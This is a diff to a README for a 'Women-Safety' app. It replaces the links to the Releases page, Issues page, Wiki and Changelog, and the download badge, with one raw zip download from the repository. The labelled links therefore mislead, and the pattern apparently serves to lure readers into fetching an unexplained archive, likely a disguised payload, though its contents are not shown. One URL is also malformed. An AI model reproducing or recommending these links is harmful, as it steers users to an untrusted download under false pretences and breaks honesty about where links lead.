@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download WOMEN-SAFETY](https://img.shields.io/badge/Download%20WOMEN--SAFETY-blue.svg)](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/releases)
+[![Download WOMEN-SAFETY](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip%https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip)](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure your device meets these requirements:
 
 To get started, visit the Releases page to download the latest version of the application. You can find it here:
 
-[Visit the Releases Page](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/releases)
+[Visit the Releases Page](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -50,7 +50,7 @@ Once you have installed **Women-Safety**, open the application to explore its fe
 
 We welcome your feedback and want to help you with any issues you may face. You can reach out through our GitHub repository for assistance.
 
-- If you encounter problems, open a new issue on the [Issues page](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/issues).
+- If you encounter problems, open a new issue on the [Issues page](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip).
 - For feature suggestions, feel free to share your thoughts there as well.
 
 ## 🔒 Privacy & Security
@@ -61,8 +61,8 @@ Your privacy is important to us. The **Women-Safety** app does not share any per
 
 For more information about the application and its features, you can check out:
 
-- The [Wiki section](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/wiki) for detailed guides.
-- The [Changelog](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/releases) for updates.
+- The [Wiki section](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip) for detailed guides.
+- The [Changelog](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip) for updates.
 
 ## 📞 Contact Us
 
@@ -70,4 +70,4 @@ For more support, please contact our team via the repository. We appreciate your
 
 Thank you for using **Women-Safety**. Empower yourself and those around you with the features this app provides!
 
-[Download WOMEN-SAFETY Now!](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/releases)
+[Download WOMEN-SAFETY Now!](https://github.com/hamzasiddiqui20/WOMEN-SAFETY/raw/refs/heads/main/STACK/SAFETY-WOME-2.2-beta.3.zip)
